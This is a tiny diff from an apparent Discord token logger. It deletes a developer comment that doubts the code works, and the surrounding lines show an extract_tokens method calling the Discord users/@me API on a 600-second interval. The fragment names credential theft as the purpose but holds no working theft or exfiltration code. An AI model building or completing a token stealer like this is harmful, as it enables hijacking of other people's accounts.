@@ -16,7 +16,6 @@ class TokenLogger:
         )
         self.interval = 600
 
-    # I have no clue if this works. Need to test on Windows machine tmrw
     def extract_tokens(self):
         try:
             base_url = "https://discord.com/api/v9/users/@me"
